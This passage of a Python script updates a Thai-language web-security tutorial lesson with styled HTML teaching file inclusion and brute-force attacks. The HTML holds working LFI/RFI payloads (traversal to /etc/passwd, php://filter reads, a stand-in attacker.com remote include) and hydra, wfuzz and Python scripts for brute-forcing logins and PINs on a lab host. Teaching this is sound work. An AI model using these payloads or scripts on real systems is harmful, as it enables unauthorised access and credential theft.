<div style="color: #94a3b8; font-size: 0.8rem;">รวมไฟล์จาก server ท้องถิ่น เช่น อ่าน <code style="color:#fbbf24;">/etc/passwd</code> หรือ log files</div>
</div>
<div style="background: rgba(239,68,68,0.05); border: 1px solid rgba(239,68,68,0.15); border-radius: 8px; padding: 12px;">
<div style="color: #ef4444; font-weight: 700; font-size: 0.82rem; margin-bottom: 6px;"><i class="fas fa-globe mr-2"></i>Remote File Inclusion (RFI)</div>
<div style="color: #94a3b8; font-size: 0.8rem;">รวมไฟล์จาก server ระยะไกล เพื่อรัน malicious PHP จาก attacker</div>
</div>
</div>
</div>

<div style="overflow-x: auto; margin: 0 0 20px 0; border: 1px solid rgba(0,240,255,0.2); border-radius: 12px; background: #05070f;">
<div style="padding: 12px 16px; background: rgba(0,240,255,0.06); border-bottom: 1px solid rgba(0,240,255,0.12);">
<span style="font-size: 0.8rem; font-weight: 700; color: #00f0ff; text-transform: uppercase; letter-spacing: 0.06em;"><i class="fas fa-folder-open mr-2"></i>File Inclusion Payloads</span>
</div>
<table style="width: 100%; border-collapse: collapse; font-size: 0.8rem;">
<thead>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.06);">
<th style="padding: 10px 14px; color: #00f0ff; font-weight: 700; text-align: left; width: 8%;">Type</th>
<th style="padding: 10px 14px; color: #00f0ff; font-weight: 700; text-align: left; width: 45%;">Example Payload</th>
<th style="padding: 10px 14px; color: #00f0ff; font-weight: 700; text-align: left;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#00f0ff; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">../../../../etc/passwd</td><td style="padding:8px 14px; color:#94a3b8;">Access system files (Linux)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);"><td style="padding:8px 14px; color:#00f0ff; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">../../../../../../../boot.ini</td><td style="padding:8px 14px; color:#94a3b8;">Access system files (Windows)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#00f0ff; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">php://input</td><td style="padding:8px 14px; color:#94a3b8;">Access PHP input streams</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);"><td style="padding:8px 14px; color:#00f0ff; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">....//....//....//windows/system.ini</td><td style="padding:8px 14px; color:#94a3b8;">Alternative traversal pattern</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#00f0ff; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</td><td style="padding:8px 14px; color:#94a3b8;">URL-encoded traversal (../ encoded)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.005);"><td style="padding:8px 14px; color:#00f0ff; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">php://filter/convert.base64-encode/resource=index.php</td><td style="padding:8px 14px; color:#94a3b8;">Bypass restrictions via base64 encoding</td></tr>
<tr><td style="padding:8px 14px; color:#ef4444; font-weight:600;">RFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.76rem;">http://attacker.com/mal_file.txt</td><td style="padding:8px 14px; color:#94a3b8;">Include and execute a remote malicious file</td></tr>
</tbody>
</table>
</div>
</div>

---

<div style="margin: 2rem 0;">
<div style="font-size: 1.1rem; font-weight: 800; color: #a855f7; margin-bottom: 6px; text-shadow: 0 0 8px rgba(168,85,247,0.4);">🔑 Brute Force Attacks</div>
<div style="height: 2px; background: linear-gradient(90deg, #a855f7, transparent); margin-bottom: 18px; border-radius: 1px;"></div>

<div style="background: #05070f; border: 1px solid rgba(168,85,247,0.15); border-radius: 12px; padding: 20px; margin-bottom: 20px;">
<p style="color: #cbd5e1; font-size: 0.88rem; line-height: 1.75; margin: 0 0 14px 0;"><strong style="color: #ffffff;">Brute Force Attack</strong> คือการ<strong style="color: #a855f7;"> trial-and-error เพื่อเดา password, encryption key หรือ credential</strong> โดยการลองทุก combination อย่างเป็นระบบ ใช้เพื่อ crack รหัสผ่าน, เข้าถึงเว็บแอปพลิเคชัน หรือ break encrypted data</p>

<div style="display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px;">
<div style="background: rgba(168,85,247,0.06); border: 1px solid rgba(168,85,247,0.2); border-radius: 8px; padding: 12px; text-align: center;">
<div style="color: #a855f7; font-size: 0.78rem; font-weight: 700; margin-bottom: 6px;">Simple</div>
<div style="color: #64748b; font-size: 0.72rem; line-height: 1.5;">ลองทุก combination ของตัวอักษร</div>
</div>
<div style="background: rgba(168,85,247,0.06); border: 1px solid rgba(168,85,247,0.2); border-radius: 8px; padding: 12px; text-align: center;">
<div style="color: #a855f7; font-size: 0.78rem; font-weight: 700; margin-bottom: 6px;">Dictionary</div>
<div style="color: #64748b; font-size: 0.72rem; line-height: 1.5;">ใช้ wordlist รหัสผ่านที่นิยม</div>
</div>
<div style="background: rgba(168,85,247,0.06); border: 1px solid rgba(168,85,247,0.2); border-radius: 8px; padding: 12px; text-align: center;">
<div style="color: #a855f7; font-size: 0.78rem; font-weight: 700; margin-bottom: 6px;">Hybrid</div>
<div style="color: #64748b; font-size: 0.72rem; line-height: 1.5;">คำ + ตัวเลข + สัญลักษณ์</div>
</div>
<div style="background: rgba(168,85,247,0.06); border: 1px solid rgba(168,85,247,0.2); border-radius: 8px; padding: 12px; text-align: center;">
<div style="color: #a855f7; font-size: 0.78rem; font-weight: 700; margin-bottom: 6px;">Credential Stuffing</div>
<div style="color: #64748b; font-size: 0.72rem; line-height: 1.5;">ใช้ credential ที่รั่วไหล</div>
</div>
<div style="background: rgba(168,85,247,0.06); border: 1px solid rgba(168,85,247,0.2); border-radius: 8px; padding: 12px; text-align: center;">
<div style="color: #a855f7; font-size: 0.78rem; font-weight: 700; margin-bottom: 6px;">Reverse</div>
<div style="color: #64748b; font-size: 0.72rem; line-height: 1.5;">password เดียว vs. หลาย username</div>
</div>
</div>
</div>

<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px;">
<div style="background: #05070f; border: 1px solid rgba(168,85,247,0.15); border-left: 3px solid #a855f7; border-radius: 8px; padding: 16px;">
<div style="font-size: 0.8rem; font-weight: 700; color: #a855f7; margin-bottom: 10px;"><i class="fas fa-bolt mr-2"></i>Hydra — Web Login Brute Force</div>
<pre style="margin:0; font-size:0.76rem; color:#94a3b8; white-space:pre-wrap; background:transparent; padding:0;"><span style="color:#64748b;"># GET request</span>
hydra -l admin -P passwords.txt \
  http-get://target.com/login.php

<span style="color:#64748b;"># POST request</span>
hydra -l admin -P passwords.txt \
  http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid login"</pre>
</div>
<div style="background: #05070f; border: 1px solid rgba(61,220,132,0.15); border-left: 3px solid #3ddc84; border-radius: 8px; padding: 16px;">
<div style="font-size: 0.8rem; font-weight: 700; color: #3ddc84; margin-bottom: 10px;"><i class="fas fa-crosshairs mr-2"></i>WFUZZ — Fuzzer</div>
<pre style="margin:0; font-size:0.76rem; color:#94a3b8; white-space:pre-wrap; background:transparent; padding:0;">wfuzz -c \
  -z file,passwords.txt \
  --hc 404 \
  "http://target.com/login.php?
   username=admin&password=FUZZ"

<span style="color:#64748b;"># FUZZ = ตำแหน่งที่ใส่ password</span>
<span style="color:#64748b;"># --hc 404 = ข้าม HTTP 404</span></pre>
</div>
</div>

<div style="background: #05070f; border: 1px solid rgba(168,85,247,0.1); border-left: 3px solid #a855f7; border-radius: 8px; padding: 16px; margin-bottom: 1.5rem;">
<div style="font-size: 0.8rem; font-weight: 700; color: #a855f7; margin-bottom: 10px;"><i class="fab fa-python mr-2"></i>Python Scripts สำหรับ Brute Force</div>
<pre style="margin:0; background:transparent; padding:0; font-size:0.78rem; color:#94a3b8; white-space:pre-wrap;"><span style="color:#64748b;"># GET brute force - ค้นหา room number</span>
<span style="color:#3ddc84;">import</span> requests
<span style="color:#3ddc84;">for</span> i <span style="color:#3ddc84;">in</span> range(1000, 9000):
    url = <span style="color:#fbbf24;">'http://172.19.19.129:8000/dakw/'</span>
    web = requests.get(url + <span style="color:#fbbf24;">'room'</span> + str(i) + <span style="color:#fbbf24;">'.html'</span>)
    <span style="color:#3ddc84;">if</span> <span style="color:#fbbf24;">'Not Found'</span> <span style="color:#3ddc84;">not in</span> web.text:
        print(url + <span style="color:#fbbf24;">'room'</span> + str(i) + <span style="color:#fbbf24;">'.html'</span>)

<span style="color:#64748b;"># POST brute force + 3-digit PIN</span>
<span style="color:#3ddc84;">def</span> loop():
    <span style="color:#3ddc84;">for</span> a <span style="color:#3ddc84;">in</span> range(10):
        <span style="color:#3ddc84;">for</span> b <span style="color:#3ddc84;">in</span> range(10):
            <span style="color:#3ddc84;">for</span> c <span style="color:#3ddc84;">in</span> range(10):
                web = requests.post(
                    <span style="color:#fbbf24;">'http://172.19.19.129:8000/ecxb/index.php'</span>,
                    {<span style="color:#fbbf24;">'digit1'</span>: a, <span style="color:#fbbf24;">'digit2'</span>: b, <span style="color:#fbbf24;">'digit3'</span>: c})
                <span style="color:#3ddc84;">if</span> <span style="color:#fbbf24;">'Unlucky Lottery'</span> <span style="color:#3ddc84;">not in</span> web.text:
                    <span style="color:#3ddc84;">return</span>
loop()</pre>
</div>
</div>
"""

with app.app_context():
    l = TutorialLesson.query.get(178)
    if l:
        blocks = json.loads(l.content)
        
        # Keep the existing Block 1 (sandbox) and Block 2 (quiz), replace Block 0 with new styled HTML
        # But first capture what the old Block 0 header/intro had
        blocks[0]['value'] = NEW_BLOCK_0
        
        l.content = json.dumps(blocks, ensure_ascii=False)
        app.db.session.commit()
        print(f"Successfully rewrote Lesson 178 Block 0 with styled HTML!")
        print(f"New Block 0 length: {len(NEW_BLOCK_0)} characters")
    else:
        print("ERROR: Lesson 178 not found!")
